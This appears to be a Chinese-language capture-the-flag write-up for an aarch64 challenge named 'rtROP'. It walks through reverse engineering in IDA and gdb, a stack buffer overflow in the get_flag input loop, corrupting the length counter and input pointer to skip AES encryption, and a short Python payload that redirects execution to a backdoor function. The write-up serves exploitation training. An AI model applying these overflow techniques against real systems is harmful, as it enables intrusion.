# rtROP

## 关键函数的定位

根据 qemu 命令可知是 aarch64 架构，在 IDA64 中打开，选择 ARM 架构，并选择 64 位程序

在 `qemu-run.sh` 的末尾增加 `-gdb tcp::12345`，运行后在 IDA 中选择 Remote GDB debugger 对代码进行调试

调试后可以记住一些特殊字节（例如字符串）的地址，来算出基地址，并使用 `Edit -> segments -> rebase program` 功能更改基地址

设置好正确的基地址后，即可通过 `Edit -> Select all` 后右键选择 `Edit -> Code` 功能进行自动分析

在字符串中可以看到

```
ROM:00000000400CEE22 00 00 00 00 00 00             DCW 0, 0, 0
ROM:00000000400CEE28 42 55 41 41 43 54 46 7B 78 78+aBuaactfXxxxxxx DCB "BUAACTF{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}",0xA,0
ROM:00000000400CEE28 78 78 78 78 78 78 2D 78 78 78+                                        ; DATA XREF: sub_400BAF08+8↑o
```

跳转到 `sub_400BAF08` 后发现

```c
__int64 sub_400BAF08()
{
  __int64 v0; // x0

  v0 = sub_400BC414("BUAACTF{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}\n");
  return sub_400AEF88(v0);
}
```

该函数为一个后门函数

此外可以根据交叉引用，找到

```
ROM:00000000400C81D0 38 05 0D 40 00 00 00 00       DCQ aGetFlag                            ; "get_flag"
ROM:00000000400C81D8 48 05 0D 40 00 00 00 00       DCQ aGetTheFlag                         ; "get the flag..."
ROM:00000000400C81E0 B0 4F 0A 40 00 00 00 00       DCQ sub_400A4FB0
```

说明 `sub_400A4FB0` 函数即为 `get_flag` 函数

> 该函数也可以通过调试的方法找到，思路为：在程序中输入 `get_flag`，并输入 `Input` 内容，但不输入回车，此时在 IDA 中搜索程序内存，可以找到自己的 `Input` 内容，此时通过下硬件断点（最好在中间的某个字节下断点）的方法找到该内存被调用的地方，并逐步跟踪

## get_flag 函数漏洞分析与利用

分析发现，函数的如下部分为获取输入内容（此处也可以结合动调分析）：

```c
  while ( 1 )
  {
    sub_4008F274(0i64, &v28, 1i64);
    *v38 = v28;
    sub_400BC414("%c", v28, v8, v9, v10, v11, v12, v13);
    if ( v28 == 10 || v28 == 13 )
      break;
    ++v38;
    ++v37;
  }
```

根据该函数内容可知，只有当输入内容为 `\n`，该函数才会停止接收数据，因此存在溢出漏洞

查看函数的栈，发现该输入内容并非位于栈底，在覆盖过程中将会影响其他变量

```c
  _BYTE v34[68]; // [xsp+108h] [xbp+108h] BYREF
  unsigned int i; // [xsp+14Ch] [xbp+14Ch]
  int v36; // [xsp+150h] [xbp+150h]
  unsigned int v37; // [xsp+154h] [xbp+154h]
  unsigned __int8 *v38; // [xsp+158h] [xbp+158h]
```

其中，`v34` 为输入开始处，因此在溢出后，将会影响 `i`，`v36`，`v37`，`v38` 四个变量，后续代码中，`i` 与 `v36` 两个变量均被重新赋值，因此实际上不存在影响，而 `v37` 与 `v38` 是输入循环中的重要变量，分别存储了输入的总长度与当前输入的位置

考虑到后续会对输入内容进行 `AES` 加密，可以通过减小总长度的方式，避免最后的 ROP 内容被加密，此外，可以通过修改 `v38` 指针的末尾字节，将输入的指针直接指向目标位置

使用 `gdb-multiarch` 动调查看栈地址

输入 `target remote 127.0.0.1:12345` 进行远程调试

在获取用户输入后的地址下断点，查看栈地址

```
pwndbg> stack 50
00:0000│ x29 sp 0x401ff940 —▸ 0x401ffaa0 —▸ 0x401ffb40 —▸ 0x401ffb70 ◂— 0x1d
01:0008│        0x401ff948 —▸ 0x400a349c ◂— mov    w1, w0 /* 0xf9400fa02a0003e1 */
02:0010│        0x401ff950 —▸ 0x401ffad8 —▸ 0x401fe92a ◂— 'get_flag'
03:0018│        0x401ff958 ◂— 0x1400e9038
04:0020│        0x401ff960 —▸ 0x401ff990 ◂— 'Input your flag: /> '
05:0028│        0x401ff968 —▸ 0xd000000400995b0 ◂— ldr    x0, [x29, #0x20] /* 0x91000400f94013a0 */
06:0030│        0x401ff970 ◂— 0xeacb8d848598bd
07:0038│        0x401ff978 ◂— 0x0
08:0040│        0x401ff980 ◂— 0xfda8bfb9aeaeb39f
09:0048│        0x401ff988 ◂— 0xdc
0a:0050│        0x401ff990 ◂— 'Input your flag: /> '
0b:0058│        0x401ff998 ◂— 'ur flag: /> '
0c:0060│        0x401ff9a0 ◂— 0x203e2f20 /* ' /> ' */
0d:0068│        0x401ff9a8 ◂— 0x1e2d0d2c06175c8
0e:0070│        0x401ff9b0 ◂— 0x4ad0ea3b4b53c9c7
0f:0078│        0x401ff9b8 ◂— movz   w17, #0x531d, lsl #16 /* 0x63b7dfd052aa63b1 */
10:0080│        0x401ff9c0 ◂— adr    x19, #0x401da891 /* 0x8dae143b30ed7693 */
11:0088│        0x401ff9c8 ◂— 0x7f38a0a369b0cdb2
12:0090│        0x401ff9d0 ◂— 0x811ffb0ff7d60ef2
13:0098│        0x401ff9d8 ◂— 0x684a8d4c82cfcb28
14:00a0│        0x401ff9e0 ◂— 0x2ffc24c6de94f309
15:00a8│        0x401ff9e8 ◂— 0x0
... ↓           11 skipped
21:0108│        0x401ffa48 ◂— 'AAAAAAAAAAAAAAAA\r'
22:0110│        0x401ffa50 ◂— 'AAAAAAAA\r'
23:0118│        0x401ffa58 ◂— 0xd /* '\r' */
24:0120│        0x401ffa60 ◂— 0x0
... ↓           4 skipped
29:0148│        0x401ffa88 ◂— 0x1500000001
2a:0150│        0x401ffa90 ◂— 0x1000000008
2b:0158│        0x401ffa98 —▸ 0x401ffa58 ◂— 0xd /* '\r' */
2c:0160│        0x401ffaa0 —▸ 0x401ffb40 —▸ 0x401ffb70 ◂— 0x1d
2d:0168│        0x401ffaa8 —▸ 0x400a3534 ◂— cmp    w0, #0 /* 0x540000617100001f */
2e:0170│        0x401ffab0 ◂— 0x0
2f:0178│        0x401ffab8 —▸ 0x401ffb64 ◂— 0x700000000
30:0180│        0x401ffac0 ◂— 0x8
31:0188│        0x401ffac8 —▸ 0x401fe92a ◂— 'get_flag'
```

结果如上，输入地址为 `0x401ffa48`

在 Arm 环境中，函数的返回地址存储在栈顶，因此在当前情况下，很难对当前函数的返回地址进行覆盖，然而，可以通过修改上一层函数的栈顶（即位于当前函数栈底）的值，控制再下一次跳转的结果

因此，可以在输入至 `0x401ffa98` 时，将该指针指向 `0x401ffaa7`，以此来控制后续的函数跳转

## Payload

根据上述思路构造的 Payload 如下：

```python
payload = b'a' * 68 + b'b' * 4 + b'c' * 4 + b'\x00' * 4 + b'\xa7' + p32(0x400baf08)
```
